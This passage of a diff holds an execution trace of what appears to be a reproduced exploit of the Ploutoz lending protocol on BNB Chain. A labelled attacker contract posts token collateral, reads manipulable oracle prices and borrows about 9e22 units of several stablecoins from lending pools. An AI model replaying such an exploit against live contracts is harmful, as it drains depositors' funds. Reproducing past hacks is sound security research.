+    │   │   │   │   ├─ [10855] 0x844FA82f1E54824655470970F7004Dd90546bB28::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 2000000000000000000000 [2e21])
+    │   │   │   │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 2000000000000000000000 [2e21])
+    │   │   │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x1EF256E054C838B0C5a544149459C7F719Ff7A8d, value: 115792089237316195423570985008687907853269984665640564037457584007913129639935 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [580111] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::borrowOrTradeFromPool(0x6a6c6c0baa55ad455683e11c2a390c3dd7564e6795f5613c7dcc12cb98e87452, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0x1EF256E054C838B0C5a544149459C7F719Ff7A8d, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [75164537943652674909 [7.516e19], 1600274620781858497 [1.6e18], 274620781858497 [2.746e14], 274620781858497 [2.746e14], 2000000000000000000000 [2e21]], 0x)
+    │   │   │   │   │   ├─ [579177] 0x067D0A19e92a65CAa2Fcd8F3c88DA8851fCd3771::borrowOrTradeFromPool(0x6a6c6c0baa55ad455683e11c2a390c3dd7564e6795f5613c7dcc12cb98e87452, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0x1EF256E054C838B0C5a544149459C7F719Ff7A8d, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [75164537943652674909 [7.516e19], 1600274620781858497 [1.6e18], 274620781858497 [2.746e14], 274620781858497 [2.746e14], 2000000000000000000000 [2e21]], 0x) [delegatecall]
+    │   │   │   │   │   │   ├─ [26896] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryRate(0x844FA82f1E54824655470970F7004Dd90546bB28, 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [10933] 0xec53e6DdD967b66DEF1C5dC8b8c51fc15c986162::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2893] 0xF45cd219aEF8618A92BAa7aD848364a158a24F33::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1079234714420436564070 [1.079e21], 60833839343655072111865173 [6.083e25], 1637659384 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 56367570956354619495684 [5.636e22]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2425] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000499fbd0572c790000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   │   │   ├─  emit topic 0: 0xfb6c38ae4fdd498b3a5003f02ca4ca5340dfedb36b1b100c679eb60633b2c0a7
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000844fa82f1e54824655470970f7004dd90546bb28
+    │   │   │   │   │   │   │        topic 3: 0xf89ecbe7d64d542aeff27b45039b2eea93672d3696e4147ebc281dd908bd263d
+    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000018fae27693b40000
+    │   │   │   │   │   │   ├─ [12799] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryReturn(0x844FA82f1E54824655470970F7004Dd90546bB28, 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 900000000000000000 [9e17]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2704] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   ├─ [11335] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::getCurrentMargin(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c, 0x844FA82f1E54824655470970F7004Dd90546bB28, 1600274620781858497 [1.6e18], 1998200000000000000000 [1.998e21]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [2433] 0xec53e6DdD967b66DEF1C5dC8b8c51fc15c986162::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [893] 0xF45cd219aEF8618A92BAa7aD848364a158a24F33::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1079234714420436564070 [1.079e21], 60833839343655072111865173 [6.083e25], 1637659384 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 56367570956354619495684 [5.636e22]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [425] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000358a3ac5ecd6efc13000000000000000000000000000000000000000000000000000499fbd0572c79
+    │   │   │   │   │   │   ├─  emit topic 0: 0x7bd8cbb7ba34b33004f3deda0fd36c92fc0360acbd97843360037b467a538f90
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000001ef256e054c838b0c5a544149459c7f719ff7a8d
+    │   │   │   │   │   │   │        topic 3: 0xf89ecbe7d64d542aeff27b45039b2eea93672d3696e4147ebc281dd908bd263d
+    │   │   │   │   │   │   │           data: 0x0000000000000000000000007130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c000000000000000000000000844fa82f1e54824655470970f7004dd90546bb2800000000000000000000000000000000000000000000000016355149fac68ec100000000000000000000000000000000000000000000006c52987915298c0000000000000000000000000000000000000000000000000004131e15055dc9ad5d0000000000000000000000000000000000000000000000000000000000001c1f000000000000000000000000000000000000000000000000000499fbd0572c7900000000000000000000000000000000000000000000000358a3ac5ecd6efc13
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000016355149fac68ec100000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000016355149fac68ec100000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000016355149fac68ec100000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000016355149fac68ec100000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   ├─ [715472] 0x1a66C619943280Df31d1F466ADa5BC4fb9F19117::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 89000000000000000000000 [8.9e22], 7200, 2000000000000000000000 [2e21], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [712684] 0x8e9654f15ee934eDab16350E933577E0F9566d27::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 89000000000000000000000 [8.9e22], 7200, 2000000000000000000000 [2e21], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x) [delegatecall]
+    │   │   │   │   ├─ [47179] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::withdrawAccruedInterest(0x55d398326f99059fF775485246999027B3197955)
+    │   │   │   │   │   ├─ [46340] 0x86FBf26921CE39F9064d454002d71e565678b493::withdrawAccruedInterest(0x55d398326f99059fF775485246999027B3197955) [delegatecall]
+    │   │   │   │   │   │   ├─ emit PayLendingFee(param0: 0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, param1: 0x55d398326f99059fF775485246999027B3197955, param2: 285269563972582 [2.852e14])
+    │   │   │   │   │   │   ├─ [12871] 0x55d398326f99059fF775485246999027B3197955::transfer(0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, 2567426075753238 [2.567e15])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, to: 0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, value: 2567426075753238 [2.567e15])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit VaultWithdraw(param0: 0x55d398326f99059fF775485246999027B3197955, param1: 0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, param2: 2567426075753238 [2.567e15])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   ├─ [3961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, 0x55d398326f99059fF775485246999027B3197955) [staticcall]
+    │   │   │   │   │   ├─ [3112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, 0x55d398326f99059fF775485246999027B3197955) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000057ca099ab537fb3460
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000057ca099ab537fb3460
+    │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x1a66C619943280Df31d1F466ADa5BC4fb9F19117) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 89858575939545527124086 [8.985e22]
+    │   │   │   │   ├─ [1961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, 0x55d398326f99059fF775485246999027B3197955) [staticcall]
+    │   │   │   │   │   ├─ [1112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, 0x55d398326f99059fF775485246999027B3197955) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000057ca099ab537fb3460
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000057ca099ab537fb3460
+    │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x1a66C619943280Df31d1F466ADa5BC4fb9F19117) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 89858575939545527124086 [8.985e22]
+    │   │   │   │   ├─ [25171] 0x55d398326f99059fF775485246999027B3197955::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 89000000000000000000000 [8.9e22])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 89000000000000000000000 [8.9e22])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 19517202160146941255 [1.951e19])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 19517202160146941255 [1.951e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [10855] 0x844FA82f1E54824655470970F7004Dd90546bB28::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 2000000000000000000000 [2e21])
+    │   │   │   │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 2000000000000000000000 [2e21])
+    │   │   │   │   │   ├─ emit Approval(owner: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, value: 115792089237316195423570985008687907853269984665640564037457584007913129639935 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [560211] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::borrowOrTradeFromPool(0x4a3df105678faf948d7c827fe3549c478063d196f9b31d6cdeab6a6b7ee05c89, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [96029891138714657970 [9.602e19], 89019517202160146941255 [8.901e22], 19517202160146941255 [1.951e19], 19517202160146941255 [1.951e19], 2000000000000000000000 [2e21]], 0x)
+    │   │   │   │   │   ├─ [559277] 0x067D0A19e92a65CAa2Fcd8F3c88DA8851fCd3771::borrowOrTradeFromPool(0x4a3df105678faf948d7c827fe3549c478063d196f9b31d6cdeab6a6b7ee05c89, 0x0000000000000000000000000000000000000000000000000000000000000000, true, 50000000000000000000 [5e19], [0x1a66C619943280Df31d1F466ADa5BC4fb9F19117, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [96029891138714657970 [9.602e19], 89019517202160146941255 [8.901e22], 19517202160146941255 [1.951e19], 19517202160146941255 [1.951e19], 2000000000000000000000 [2e21]], 0x) [delegatecall]
+    │   │   │   │   │   │   ├─ [26896] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryRate(0x844FA82f1E54824655470970F7004Dd90546bB28, 0x55d398326f99059fF775485246999027B3197955) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [10933] 0x57CbE19Be766accDe468d0a7E2C5B69E09ab28bA::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2893] 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 146162447674785922649797247 [1.461e26], 146146832803006724583411482 [1.461e26], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 999893167690965729 [9.998e17]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2425] 0x55d398326f99059fF775485246999027B3197955::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000003f54b034863fd26340000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   │   │   ├─  emit topic 0: 0xfb6c38ae4fdd498b3a5003f02ca4ca5340dfedb36b1b100c679eb60633b2c0a7
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000844fa82f1e54824655470970f7004dd90546bb28
+    │   │   │   │   │   │   │        topic 3: 0x606bf10d53e26ce9ff1bf13a01f931be1b542ec4347a1845bd5b0ba40c30c573
+    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000018fae27693b40000
+    │   │   │   │   │   │   ├─ [12799] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::queryReturn(0x844FA82f1E54824655470970F7004Dd90546bB28, 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 900000000000000000 [9e17]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [2704] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   │   └─ ← [Revert] revert: target not active
+    │   │   │   │   │   │   ├─ [11335] 0x86043747dae9b6dd80C463A29e5B21e50BeF5e7d::getCurrentMargin(0x55d398326f99059fF775485246999027B3197955, 0x844FA82f1E54824655470970F7004Dd90546bB28, 89019517202160146941255 [8.901e22], 1998200000000000000000 [1.998e21]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2044] 0xA41BF81be90fe9666CD566A80c85871f41529aed::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [504] 0xC789F6C658809eED4d1769a46fc7BCe5dbB8316E::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 14033265246616006481312 [1.403e22], 1024535809866719119382771 [1.024e24], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 73007656583258593795 [7.3e19]
+    │   │   │   │   │   │   │   ├─ [2433] 0x57CbE19Be766accDe468d0a7E2C5B69E09ab28bA::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [893] 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 146162447674785922649797247 [1.461e26], 146146832803006724583411482 [1.461e26], 1637659441 [1.637e9]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 999893167690965729 [9.998e17]
+    │   │   │   │   │   │   │   ├─ [381] 0x844FA82f1E54824655470970F7004Dd90546bB28::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   ├─ [425] 0x55d398326f99059fF775485246999027B3197955::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000376bc6cfa3428438c000000000000000000000000000000000000000000000003f54b034863fd2634
+    │   │   │   │   │   │   ├─  emit topic 0: 0x7bd8cbb7ba34b33004f3deda0fd36c92fc0360acbd97843360037b467a538f90
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000001a66c619943280df31d1f466ada5bc4fb9f19117
+    │   │   │   │   │   │   │        topic 3: 0x606bf10d53e26ce9ff1bf13a01f931be1b542ec4347a1845bd5b0ba40c30c573
+    │   │   │   │   │   │   │           data: 0x00000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000844fa82f1e54824655470970f7004dd90546bb280000000000000000000000000000000000000000000012d9c1f871bfaaab854700000000000000000000000000000000000000000000006c52987915298c000000000000000000000000000000000000000000000000000534aeb533d684e4b20000000000000000000000000000000000000000000000000000000000001c1f000000000000000000000000000000000000000000000003f54b034863fd263400000000000000000000000000000000000000000000000376bc6cfa3428438c
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000012d9c1f871bfaaab854700000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000012d9c1f871bfaaab854700000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000012d9c1f871bfaaab854700000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000012d9c1f871bfaaab854700000000000000000000000000000000000000000000006c52987915298c0000
+    │   │   ├─ [689709] 0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 90000000000000000000000 [9e22], 7200, 2000000000000000000000 [2e21], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [686921] 0x8e9654f15ee934eDab16350E933577E0F9566d27::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 90000000000000000000000 [9e22], 7200, 2000000000000000000000 [2e21], 0x844FA82f1E54824655470970F7004Dd90546bB28, Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x) [delegatecall]
+    │   │   │   │   ├─ [44568] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::withdrawAccruedInterest(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56)
+    │   │   │   │   │   ├─ [43729] 0x86FBf26921CE39F9064d454002d71e565678b493::withdrawAccruedInterest(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) [delegatecall]
+    │   │   │   │   │   │   ├─ emit PayLendingFee(param0: 0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, param1: 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, param2: 9223681300480252 [9.223e15])
+    │   │   │   │   │   │   ├─ [12871] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, 83013131704322277 [8.301e16])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, to: 0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, value: 83013131704322277 [8.301e16])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit VaultWithdraw(param0: 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, param1: 0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, param2: 83013131704322277 [8.301e16])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Return] 
+    │   │   │   │   ├─ [3961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) [staticcall]
+    │   │   │   │   │   ├─ [3112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000086d341acc6633e8d9a
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000086d341acc6633e8d9a
+    │   │   │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 91269990293938030066002 [9.126e22]
+    │   │   │   │   ├─ [1961] 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C::getTotalPrincipal(0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) [staticcall]
+    │   │   │   │   │   ├─ [1112] 0x628035bAc24e451Da14981e9B46cC0FaB86711c2::getTotalPrincipal(0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000086d341acc6633e8d9a
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000086d341acc6633e8d9a
+    │   │   │   │   ├─ [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 91269990293938030066002 [9.126e22]
+    │   │   │   │   ├─ [23171] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 90000000000000000000000 [9e22])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, to: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 90000000000000000000000 [9e22])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [3271] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::transfer(0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 19374766508720631735 [1.937e19])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x27b6031E9cbB9a383ACf2f7d7168Ba052ccaeCfb, to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 19374766508720631735 [1.937e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [10855] 0x844FA82f1E54824655470970F7004Dd90546bB28::transferFrom(Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, 2000000000000000000000 [2e21])
+    │   │   │   │   │   ├─ emit Transfer(from: Ploutoz: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAd2d8F920A3795C1EeE47a00C1056c801eAaD18C, value: 2000000000000000000000 [2e21])
